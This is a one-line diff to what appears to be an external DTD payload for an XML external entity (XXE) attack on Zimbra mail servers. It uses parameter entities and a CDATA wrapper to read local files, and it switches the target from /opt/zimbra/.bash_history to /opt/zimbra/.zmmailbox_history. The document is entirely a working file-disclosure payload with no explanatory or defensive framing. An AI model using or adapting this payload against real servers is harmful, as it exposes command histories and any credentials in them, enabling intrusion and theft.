@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:///opt/zimbra/.bash_history"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "file:///opt/zimbra/.zmmailbox_history"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
